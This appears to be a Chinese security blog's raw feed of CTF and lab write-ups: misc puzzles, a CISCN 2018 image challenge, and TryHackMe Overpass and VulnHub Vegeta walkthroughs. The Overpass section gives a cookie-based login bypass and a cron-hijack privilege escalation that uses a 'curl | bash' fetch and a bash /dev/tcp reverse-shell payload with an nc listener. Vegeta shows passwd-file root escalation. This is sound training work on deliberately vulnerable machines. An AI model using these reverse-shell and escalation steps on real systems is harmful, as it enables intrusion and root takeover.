class="line"></span><br></pre></td></tr></table></figure><blockquote><p>得到MTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ&#x3D;<br><strong>base64解码</strong><br>14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184<br><strong>根据题目提示tupper公式（塔珀自指公式）</strong><br>直接<br><a href="https://tuppers-formula.ovh/">在线网站</a>画图</p></blockquote><h1 id="where-is-crazyman-v1-0"><a href="#where-is-crazyman-v1-0" class="headerlink" title="where is crazyman v1.0"></a>where is crazyman v1.0</h1><blockquote><p>没想到这么简单 直接百度识图 秋叶原</p></blockquote><h1 id="where-is-crazyman-v2-0"><a href="#where-is-crazyman-v2-0" class="headerlink" title="where is crazyman v2.0"></a>where is crazyman v2.0</h1><blockquote><p>怎么说呢….. 先用google 识别一下找找相似<br>emm…我只能说相似的船好多…..最后注意到了一个长长的蓝色建筑 发现了一段视频极其相似<br><a href="https://arabsstock.com/en/videos/clip-162878-spending-enjoyable-time-getting-know-civilizations-entertainment">https://arabsstock.com/en/videos/clip-162878-spending-enjoyable-time-getting-know-civilizations-entertainment</a>  沙特 利雅得但是不知道是那个景区<br>根据关键字利雅得人工湖<br>找到<a href="https://www.prnasia.com/story/379217-1.shtml">https://www.prnasia.com/story/379217-1.shtml</a> <em><strong>Boulevard World</strong></em></p></blockquote><h1 id="where-is-crazyman-v3-0"><a href="#where-is-crazyman-v3-0" class="headerlink" title="where is crazyman v3.0"></a>where is crazyman v3.0</h1><blockquote><p>提示:</p><blockquote><p>1.flag和地址没有直接关系 请不要提交地址 也不在所给图片里 不存在任何形式隐写 请使用OSINT工具和相关的方法找到flag<br>2.先找到地址再拿到flag 秘密指得是隐藏的flag<br>3.如果需要确定地址 请找crazyman<br>4.星巴克和酒店很近 步行不到5min</p></blockquote></blockquote><blockquote><p>怎么说呢<br>从矿泉水中得到BOUDL APART HOTEL  同时得到是星巴克<br>地图上搜 酒店 一个一个找 看看 哪个酒店 附近五分钟是星巴克<br>最后得到<br><img src="https://img2.imgtp.com/2024/02/11/ipLc67fO.jpg"><br>找到附近的星巴克<br>看最新的评论 YmVnaW57R29vZ2xlX21hcF9pc191c2VmdWxfYW5kX25vdF9mb3JnZXRfY29tbWVudH0&#x3D;<br>解码</p></blockquote><h1 id="devil’s-word"><a href="#devil’s-word" class="headerlink" title="devil’s word"></a>devil’s word</h1><blockquote><p>leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d</p></blockquote><blockquote><p>没做出来….  看到魔鬼的语言没想到是温州话<br>leng:0<br>i:1<br>lia:2<br>sa:3<br>sii:4<br>ng:5<br>leu:6<br>cai:7<br>bo:8<br>jau:9<br>其中字母对应数字加上中间穿插的 字母组成十六进制626567696e7b7930755f6b6e30775f77336e7a686f755f6469346c6563747d<br>最后转字符串</p></blockquote><h1 id="你知道中国文化嘛"><a href="#你知道中国文化嘛" class="headerlink" title="你知道中国文化嘛"></a>你知道中国文化嘛</h1><blockquote><p>看出是base32 但是怎么也解不出结果  后来发现是有一些特殊字符<br>@ $ &amp;  根据base32 只有 2-7 A-Z  则 @换成 2 $换成S &amp; 换成 7<br>之后是 八卦 解码  社会主义核心 价值观解密 最后 w型栅栏5</p></blockquote><h1 id="下一站上岸"><a href="#下一站上岸" class="headerlink" title="下一站上岸"></a>下一站上岸</h1><blockquote><p><img src="https://img2.imgtp.com/2024/02/11/CqLoqlbK.png"><br>我是真喜欢这一题……<br>有一种上不了岸的破碎感……<br>试了很多图片的隐写 最后也找了图片的格式在末尾  看到base编码的密文 解码后是提示<br>摩斯密码<br>最后根据 图形交点 一个交点 未 . 两个交点为 -  没有交点为 空格 </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tryhackme-Overpass</title>
      <link href="/2024/02/01/tryhackme-overpass-wp/"/>
      <url>/2024/02/01/tryhackme-overpass-wp/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><p><em><strong>Tryhackme-Overpass-wp</strong></em></p><blockquote><p>hello 大家今天是一波 thm的overpass靶场的wp</p></blockquote><h1 id="主机信息探测"><a href="#主机信息探测" class="headerlink" title="主机信息探测"></a>主机信息探测</h1><p><img src="https://img2.imgtp.com/2024/02/01/MQwmwDJP.jpg"></p><blockquote><p>从80端口找web漏洞或者ssh爆破,但是ssh爆破难度太大,先看web</p></blockquote><h1 id="web枚举"><a href="#web枚举" class="headerlink" title="web枚举"></a>web枚举</h1><blockquote></blockquote><p><img src="https://img2.imgtp.com/2024/02/01/3TYWDkvN.jpg"></p><blockquote><p>找到admin目录  可能有身份验证损坏让我们登陆到后台<br>之后根据提示不用暴力破解 则看到了login.js</p></blockquote><h1 id="身份验证cookie更改"><a href="#身份验证cookie更改" class="headerlink" title="身份验证cookie更改"></a>身份验证cookie更改</h1><blockquote><p>login.js</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> usernameBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#username&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> passwordBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#password&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> loginStatus = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#loginStatus&quot;</span>);</span><br><span class="line">    loginStatus.<span class="property">textContent</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">const</span> creds = &#123; <span class="attr">username</span>: usernameBox.<span class="property">value</span>, <span class="attr">password</span>: passwordBox.<span class="property">value</span> &#125;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">postData</span>(<span class="string">&quot;/api/login&quot;</span>, creds)</span><br><span class="line">    <span class="keyword">const</span> statusOrCookie = <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line">    <span class="keyword">if</span> (statusOrCookie === <span class="string">&quot;Incorrect credentials&quot;</span>) &#123;</span><br><span class="line">        loginStatus.<span class="property">textContent</span> = <span class="string">&quot;Incorrect Credentials&quot;</span></span><br><span class="line">        passwordBox.<span class="property">value</span>=<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Cookies</span>.<span class="title function_">set</span>(<span class="string">&quot;SessionToken&quot;</span>,statusOrCookie)</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;/admin&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>两种方法绕过:<br><strong>方法一:</strong> 代码审计发现如果登录返回不是Incorrect credentials则设置cookie<br>我们可以控制bp 抓登陆的响应包将包的Incorrect credentials修改并且设置302响应&gt;头loaction:&#x2F;admin<br><strong>方法二:</strong> 直接在控制台修改document.cookie&#x3D;”SessionToken”</p></blockquote><h1 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h1><blockquote><p>在&#x2F;admin找到ssh私钥,将私钥保存位rsa,但是要找到私钥的密码可以利用ssh2john 和john破解密码<br>最后找到私钥密码james13<br>直接利用ssh登陆<br><img src="https://img2.imgtp.com/2024/02/01/NctBPrVj.jpg"><br>获取user的flag</p></blockquote><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><blockquote><p>可以看到todo.txt有提示在&#x2F;etc&#x2F;crontab中发现有root 权限的脚本<br>root curl overpass.thm&#x2F;downloads&#x2F;src&#x2F;buildscript.sh | bash<br>并且&#x2F;etc&#x2F;hosts我们可以修改此时就想到我们可以 利用root的cronjob来进行一个反弹shell</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote><p>将&#x2F;etc&#x2F;hosts的 overpass.thm 对应的ip修改为本机的ip<br>本机开http服务  python -m http.server 80<br><strong>Ps:</strong><br>  注意本机的网站目录必须是downloads&#x2F;src&#x2F;buildscript.sh<br>并且buildscript.sh 应该修改为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;本机ip&#x2F;本机端口 0&gt;&amp;!<br>最后在本机中开启nc -lvp  本机端口开启监听等几秒就会有root的shell连接</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>overpass1 还是比较简单的主要还是要掌握一些基本的提权方法以及web登陆的相关机制的知识</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-vegeta</title>
      <link href="/2024/02/01/vulnhub-vegeta%E9%9D%B6%E5%9C%BAwp/"/>
      <url>/2024/02/01/vulnhub-vegeta%E9%9D%B6%E5%9C%BAwp/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><p><img src="https://img2.imgtp.com/2024/03/06/V1HMZa8d.jpg"></p><h1 id="阅读须知："><a href="#阅读须知：" class="headerlink" title="阅读须知："></a>阅读须知：</h1><pre><code>探索者安全团队技术文章仅供参考,未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作,由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任,如有侵权烦请告知，我们会立即删除并致歉,创作不易转载请标明出处.感谢!</code></pre><p> <strong>vulnhub</strong>  -<em>vegeta 靶机</em></p><blockquote><ul><li>攻击机kali</li><li>受害机   vulnhub靶场 vegeta机器</li></ul></blockquote><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><blockquote><p> 利用kali 自带 arp-scan 扫描网段  </p><p>获得受害机器ip  192.168.49.134  </p></blockquote><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><p>先用masscan 扫描开放端口 再利用nmap 做端口信息的进一步收集<br><img src="https://img2.imgtp.com/2024/01/22/z9XjEXEe.jpg" alt="在这里插入图片描述"></p><blockquote><p><strong>masscan探测到靶机有两个端口  22 端口  80端口 对靶机端口进行进一步的详细信息收集</strong>  </p></blockquote><p><img src="https://img2.imgtp.com/2024/01/22/zGZ7TXee.jpg" alt="在这里插入图片描述"></p><blockquote><p>扫描到端口具体信息  访问80端口服务</p></blockquote><h2 id="web目录探测"><a href="#web目录探测" class="headerlink" title="web目录探测"></a>web目录探测</h2><p><img src="https://img2.imgtp.com/2024/01/22/kxmp25uK.jpg" alt="在这里插入图片描述"></p><blockquote><p>dirserch工具扫描网站目录<br>扫描了很多目录 依次访问寻找突破点</p></blockquote><p><img src="https://img2.imgtp.com/2024/01/22/3tvB1WC0.jpg" alt="在这里插入图片描述"></p><blockquote><p>发现有robots.txt泄露访问一下 看到一个&#x2F;find_me下的目录</p></blockquote><p><img src="https://img2.imgtp.com/2024/01/22/EJGPwv9E.jpg" alt="在这里插入图片描述"></p><blockquote><p>访问find_me.html 源代码  起初很正常但是仔细往后看一直下拉才会发现惊喜!!!<br>这个就告诉我们不要放过每一个细节<br>要看仔细<br>源代码一直往下拉可以看到一串字符串</p></blockquote><p>aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw&#x3D;&#x3D;</p><blockquote><p>感觉像是base64 在线<a href="https://cyberchef.org/">烹饪一下</a><br>果然两次base64  然后得到二维码<br>这个地方想请教各位大佬怎么自己解码可以得到二维码. 我是直接自己在烹饪时候他自动识别二维码得到了一个密码,但是两次base我没办法得到二维码。</p></blockquote><p><img src="https://img2.imgtp.com/2024/01/22/Rvr3A6X0.jpg" alt="在这里插入图片描述"></p><blockquote><p>怀疑可能是ssh的密码但是不知道用户名试了很多都不对<br>线索断了 ，没事继续信息收集</p></blockquote><h2 id="继续识别"><a href="#继续识别" class="headerlink" title="继续识别"></a>继续识别</h2><blockquote><p>这回咱们用个大字典扫描目录<br><strong>建议可以装一个seclists 字典</strong><br><img src="https://img2.imgtp.com/2024/01/22/D6S9mt6Y.jpg" alt="在这里插入图片描述"></p><blockquote><p>发现一个新目录 访问是一个音频  摩斯电码<br>好好好  ctf 是吧……<br>misc 杂项隐写 音频直接</p></blockquote></blockquote><p><a href="https://morsecode.world/international/decoder/audio-decoder-expert.html">在线音频识别</a></p><p><em>识别到密码和账号 U S E R : T R U N K S P A S S W G R D : U S 3 R ( S I N D O L L A R S S Y M B O L )</em></p><blockquote><p><em><strong>注意</strong></em>: s改成$ 括号内的提示</p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote><p>ssh 连接 靶机<br>ssh $<a href="mailto:&#x74;&#114;&#x75;&#110;&#x6b;&#115;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x34;&#57;&#46;&#x31;&#51;&#52;">trunks@192.168.49.134</a><br><img src="https://img2.imgtp.com/2024/01/22/NK6mG2z8.jpg" alt="在这里插入图片描述"></p></blockquote><blockquote><p>访问passwd 文件  发现其属于我们登陆的用户那么就可以用passwd提权<br>用openssl 生成密码 将新用户写入passwd文件 提权<br><img src="https://img2.imgtp.com/2024/01/22/AAZrAYqH.jpg" alt="在这里插入图片描述"><br><img src="https://img2.imgtp.com/2024/01/22/Iq4gGSD2.jpg" alt="在这里插入图片描述"></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>本次vulhub 靶场的 vegeta靶机相对来说还是比较简单的,其实还是很有ctf的风格的,主要就是一个web的脑洞寻找细节以及misc题目的音频隐写的学习,<br>最后就是ssh简单连接和passwd提权，对于新手还是很推荐来练练手的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN_2018Picture_misc_wp</title>
      <link href="/2024/01/30/CISCN-2018Picture-misc-wp/"/>
      <url>/2024/01/30/CISCN-2018Picture-misc-wp/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><p><em><strong>CISCN_2018Picture_misc_wp</strong></em></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="第一关-文件分离"><a href="#第一关-文件分离" class="headerlink" title="第一关 文件分离"></a>第一关 文件分离</h2><blockquote><p>拿到一张图片,看到jpeg 格式文件结尾之后依旧还有数据,猜想可能是隐藏了某些文件<br>直接拿到binwalk中分析一下<br><img src="https://img2.imgtp.com/2024/01/30/Nn90WIdJ.jpg"><br>可以看到里面又一个zlib压缩包<br>直接binwalk -e –run-as&#x3D;root ‘[CISCN 2018]Picture.jpg’<br>直接得到压缩包的结果</p></blockquote><h2 id="第二关-编码-文件格式"><a href="#第二关-编码-文件格式" class="headerlink" title="第二关 编码&amp;文件格式"></a>第二关 编码&amp;文件格式</h2><blockquote><p>zlib解压之后 S1ADBBQAAQAAADkwl0xs4x98WgAAAE4AAAAEAAAAY29kZePegfAPrkdnhMG2gb86&#x2F;AHHpS0GMqCrR9s21bP43SqmesL+oQGo50ljz4zIctqxIsTHV25+1mTE7vFc9gl5IUif7f1&#x2F;rHIpHql7nqKPb+2M6nRLuwhU8mb&#x2F;w1BLAQI&#x2F;ABQAAQAAADkwl0xs4x98WgAAAE4AAAAEACQAAAAAAAAAIAAAAAAAAABjb2RlCgAgAAAAAAABABgAAFvDg4Xa0wE8gAmth9rTATyACa2H2tMBUEsFBgAAAAABAAEAVgAAAHwAAADcAFtQeXRob24gMi43XQ0KPj4+IKh9qH2ofQ0KDQpUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6DQogIEZpbGUgIjxweXNoZWxsIzA+IiwgbGluZSAxLCBpbiA8bW9kdWxlPg0KICAgIKh9qH2ofQ0KWmVyb0RpdmlzaW9uRXJyb3I6IKh9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofSA8LSBwYXNzd29yZCA7KQ0KPj4+IAA&#x3D;<br>之后利用base64 解压<br><img src="https://img2.imgtp.com/2024/01/30/DVGCscaG.jpg"></p></blockquote><p><strong>PS:</strong> 虽然看着像乱码 但是这种 还是有提示 所以判断应该就是base64</p><blockquote><p>查看文件由两部分构成 根据 PK 50 4B 03 04 可以判断是一个zip压缩包和python报?错,将base64解码之后直接导入 到zip文件<br><em><strong>注意 :</strong></em> 不要在在线网站解码后复制进入1.zip中 有不可见字符</p></blockquote><p><em><strong>Python脚本:</strong></em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">S1ADBBQAAQAAADkwl0xs4x98WgAAAE4AAAAEAAAAY29kZePegfAPrkdnhMG2gb86/AHHpS0GMqCrR9s21bP43SqmesL+oQGo50ljz4zIctqxIsTHV25+1mTE7vFc9gl5IUif7f1/rHIpHql7nqKPb+2M6nRLuwhU8mb/w1BLAQI/ABQAAQAAADkwl0xs4x98WgAAAE4AAAAEACQAAAAAAAAAIAAAAAAAAABjb2RlCgAgAAAAAAABABgAAFvDg4Xa0wE8gAmth9rTATyACa2H2tMBUEsFBgAAAAABAAEAVgAAAHwAAADcAFtQeXRob24gMi43XQ0KPj4+IKh9qH2ofQ0KDQpUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6DQogIEZpbGUgIjxweXNoZWxsIzA+IiwgbGluZSAxLCBpbiA8bW9kdWxlPg0KICAgIKh9qH2ofQ0KWmVyb0RpdmlzaW9uRXJyb3I6IKh9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofSA8LSBwYXNzd29yZCA7KQ0KPj4+IAA=</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">str1=base64.b64decode(str1.encode())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;d:/1.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(str1)</span><br></pre></td></tr></table></figure><blockquote><p>此时我们发现1.zip可以打开但是无法提取code 回头发现在010中发现KP 反了<br>第一个KP修改为PK</p></blockquote><h2 id="第三关-密码"><a href="#第三关-密码" class="headerlink" title="第三关 密码"></a>第三关 密码</h2><blockquote><p>1.zip 压缩之后开开是code 需要密码可以看到python报错已经提示:<br>ZeroDivisionError: �}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�}�} &lt;- password ;) 搜索ZeroDivisionError得到 integer division or modulo by zero就是密码<br>打开得到G0TE30TY[,C,X.$%&amp;,C@Y,T5”.#5%0C%”-#,Y04)&amp;1C8Q-S,Q.49]<br>&#96;直接uuencode解码</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><blockquote><p>主要是文件格式的问题 以及一些细节要注意</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssctf-round#16web部分wp</title>
      <link href="/2024/01/26/nssctf-round-16web%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/01/26/nssctf-round-16web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><hr><blockquote><p>hello ,今天带来的是最近的nssctf的round#16的web wp</p></blockquote><h1 id="NSSRound-16-Basic-RCE但是没有完全RCE"><a href="#NSSRound-16-Basic-RCE但是没有完全RCE" class="headerlink" title="[NSSRound#16 Basic]RCE但是没有完全RCE"></a>[NSSRound#16 Basic]RCE但是没有完全RCE</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>] !== </span><br><span class="line">(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span 